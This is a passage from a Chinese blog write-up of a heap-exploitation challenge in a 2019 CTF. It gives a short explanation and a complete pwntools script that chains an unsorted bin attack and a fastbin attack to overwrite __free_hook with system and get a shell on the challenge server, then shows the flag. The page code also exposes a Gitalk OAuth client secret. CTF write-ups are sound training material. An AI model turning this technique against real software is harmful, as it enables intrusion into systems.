href="#3、因为使用了unsorted-bin-attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted-bin-attack之前申请然后free三种不同堆块，且保证unsorted-bin-attack过程中不会用到这些fastbin即可，在完成unsorted-bin-attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin-attack覆盖free-hook" class="headerlink" title="3、因为使用了unsorted bin attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted bin attack之前申请然后free三种不同堆块，且保证unsorted bin attack过程中不会用到这些fastbin即可，在完成unsorted bin attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin attack覆盖free_hook"></a>3、因为使用了unsorted bin attack，所以破坏了堆块申请机制，只要申请非之前已经free的fastbin就会报错，这个问题我花了5个小时去调试，最后只需在unsorted bin attack之前申请然后free三种不同堆块，且保证unsorted bin attack过程中不会用到这些fastbin即可，在完成unsorted bin attack之后，只需还有能申请三个堆块，其中一块为0x68大小，且三个堆块的高位地址全部相同，就可以使用fastbin attack覆盖free_hook</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("pwn1")</span><br><span class="line">sh = 0</span><br><span class="line">lib = 0</span><br><span class="line">def add(size):</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("1")</span><br><span class="line">	sh.recvuntil("Input the size")</span><br><span class="line">	sh.sendline(str(size))</span><br><span class="line">def free():</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("2")</span><br><span class="line">def show():</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("3")</span><br><span class="line">def edit(content):</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("5")</span><br><span class="line">	sh.recvuntil("Input the note")</span><br><span class="line">	sh.send(content)</span><br><span class="line">def editName(name):</span><br><span class="line">	sh.recvuntil("6.exit")</span><br><span class="line">	sh.sendline("4")</span><br><span class="line">	sh.recvuntil("Please input your name")</span><br><span class="line">	sh.send(name)</span><br><span class="line">def init(name):</span><br><span class="line">	sh.recvuntil("Please input your name")</span><br><span class="line">	sh.send(name)</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line">	global sh</span><br><span class="line">	global lib</span><br><span class="line">	if(debug == 1):</span><br><span class="line">		sh = process("./pwn1")</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">	else:</span><br><span class="line">		sh = remote(ip,port)</span><br><span class="line">		lib = ELF("libc-2.23.so")</span><br><span class="line">		</span><br><span class="line">	#0000000000202090</span><br><span class="line">	main_arena_offset = 0x3C4B20</span><br><span class="line">	init("a"*0x30)</span><br><span class="line">	add(0x80)</span><br><span class="line">	add(0x18)</span><br><span class="line">	editName("a"*0x30 + "\x10")</span><br><span class="line">	free()</span><br><span class="line">	add(0x18)</span><br><span class="line">	editName("a"*0x30 + "\x30")</span><br><span class="line">	show()</span><br><span class="line">	sh.recvuntil("\n")</span><br><span class="line">	main_arena = u64(sh.recvuntil("\n",True).ljust(8,"\x00")) - 88</span><br><span class="line">	libc = main_arena - main_arena_offset</span><br><span class="line">	system = libc + lib.symbols['system']</span><br><span class="line">	unsorted_bin_attack_addr = libc + 0x3C6768</span><br><span class="line">	fastbin_attack_addr = unsorted_bin_attack_addr + 0x18 - 0x1b + 0x10</span><br><span class="line">	add(0x10)</span><br><span class="line">	free()</span><br><span class="line">	add(0x68)</span><br><span class="line">	free()</span><br><span class="line">	add(0x30)</span><br><span class="line">	free()</span><br><span class="line">	add(0x90)</span><br><span class="line">	add(0x20)</span><br><span class="line">	editName("a" * 0x30 + "\x30")</span><br><span class="line">	free()</span><br><span class="line">	add(0x50)</span><br><span class="line">	editName("a" * 0x30 + "\x90")</span><br><span class="line">	edit('a' * 8 + p64(unsorted_bin_attack_addr))</span><br><span class="line">	add(0x30)</span><br><span class="line">	add(0x68)</span><br><span class="line">	add(0x10)	</span><br><span class="line">	editName("a" * 0x30 + "\xc0")</span><br><span class="line">	free()</span><br><span class="line">	add(0x40)</span><br><span class="line">	editName("a" * 0x30 + "\xc0")</span><br><span class="line">	edit(p64(fastbin_attack_addr))</span><br><span class="line">	add(0x68)</span><br><span class="line">	add(0x68)</span><br><span class="line">	payload = "sh\x00"</span><br><span class="line">	payload = payload.ljust(0x30 - 5 - 8,"\x00")</span><br><span class="line">	edit(payload + p64(system))</span><br><span class="line">	free()</span><br><span class="line">	log.success("fastbin_attack_addr: " + hex(fastbin_attack_addr))</span><br><span class="line">	log.success("unsorted_bin_attack_addr: " + hex(unsorted_bin_attack_addr))</span><br><span class="line">	log.success("main_arena: " + hex(main_arena))</span><br><span class="line">	log.success("libc: " + hex(libc))</span><br><span class="line">	#gdb.attach(sh)</span><br><span class="line">	sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">	pwn("39.106.184.130",8090,0)</span><br></pre></td></tr></tbody></table></figure></div>
<p><a href="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2019/07/04/CTF-NSCTF-2019%E5%B9%B47%E6%9C%88/10.png" class="lazyload"></a></p>
<h2 id="flag-pl4y-with-global-buffer-0verflow"><a href="#flag-pl4y-with-global-buffer-0verflow" class="headerlink" title="flag{pl4y_with_global_buffer_0verflow}"></a>flag{pl4y_with_global_buffer_0verflow}</h2></body></html></div></article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF    </a></div><div class="post_share"><div class="social-share" data-image="/2019/07/04/CTF-NSCTF-2019年7月/bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/wechat.jpg" alt="微信"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="/img/alipay.jpg" alt="支付宝"><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2019/07/09/CTF-%E8%B5%9B%E5%8D%9A%E6%9D%AFCyberCTF-19%E5%B9%B47%E6%9C%88/"><img class="prev_cover lazyload" data-src="/2019/07/09/CTF-赛博杯CyberCTF-19年7月/bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>CTF-赛博杯CyberCTF-19年7月</span></div></a></div><div class="next-post pull_right"><a href="/2019/06/28/CTF-2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8B%E8%B5%9B/"><img class="next_cover lazyload" data-src="/2019/06/28/CTF-2019国赛线下赛/bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>CTF-2019国赛线下赛</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2018/11/09/Blowfish加密算法简介/" title="密码学-Blowfish加密算法"><img class="relatedPosts_cover lazyload"data-src="/2018/11/09/Blowfish加密算法简介/1.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-01-14</div><div class="relatedPosts_title">密码学-Blowfish加密算法</div></div></a></div><div class="relatedPosts_item"><a href="/2019/08/30/CTF-19年OPPO_OGeek_线上赛/" title="CTF-19年OPPO_OGeek_线上赛"><img class="relatedPosts_cover lazyload"data-src="/2019/08/30/CTF-19年OPPO_OGeek_线上赛/bg.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-01-14</div><div class="relatedPosts_title">CTF-19年OPPO_OGeek_线上赛</div></div></a></div><div class="relatedPosts_item"><a href="/2019/09/23/CTF-19年浙江省大学生网络安全大赛/" title="CTF-19年浙江省大学生网络安全大赛"><img class="relatedPosts_cover lazyload"data-src="/2019/09/23/CTF-19年浙江省大学生网络安全大赛/bg.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-01-14</div><div class="relatedPosts_title">CTF-19年浙江省大学生网络安全大赛</div></div></a></div><div class="relatedPosts_item"><a href="/2019/08/26/CTF-19年网络与信息安全领域专项赛/" title="CTF-19年网络与信息安全领域专项赛"><img class="relatedPosts_cover lazyload"data-src="/2019/08/26/CTF-19年网络与信息安全领域专项赛/bg.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-01-14</div><div class="relatedPosts_title">CTF-19年网络与信息安全领域专项赛</div></div></a></div><div class="relatedPosts_item"><a href="/2019/08/30/CTF-19年第五空间网络安全大赛线上赛/" title="CTF-19年第五空间网络安全大赛线上赛"><img class="relatedPosts_cover lazyload"data-src="/2019/08/30/CTF-19年第五空间网络安全大赛线上赛/bg.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-01-14</div><div class="relatedPosts_title">CTF-19年第五空间网络安全大赛线上赛</div></div></a></div><div class="relatedPosts_item"><a href="/2019/11/13/CTF-2019年11月成都大学CTF/" title="CTF-2019年11月成都大学CTF"><img class="relatedPosts_cover lazyload"data-src="/2019/11/13/CTF-2019年11月成都大学CTF/bg.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2020-01-14</div><div class="relatedPosts_title">CTF-2019年11月成都大学CTF</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" aria-hidden="true"></i><span> 评论</span></div><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '560d606afb5e3201949f',
  clientSecret: 'adf278d9baa268981569ab6db3020b28d99f2aec',
  repo: '196011564.github.io',
  owner: '196011564',
  admin: '196011564',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN# en , zh-CN , zh-TW',
  updateCountCallback: commentCount
})
gitalk.render('gitalk-container')

function commentCount(n){
  document.getElementsByClassName('gitalk-comment-count')[0].innerHTML= n
}</script></div></div></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2020 By 咲夜南梦</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly" target="_blank" rel="noopener"><span>Butterfly</span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换" target="_self">繁</a><i class="darkmode fa fa-moon-o" id="darkmode" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@latest/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@latest/lazysizes.min.js" async=""></script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a href="https://github.com/wzpan/hexo-generator-search" target="_blank" rel="noopener" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>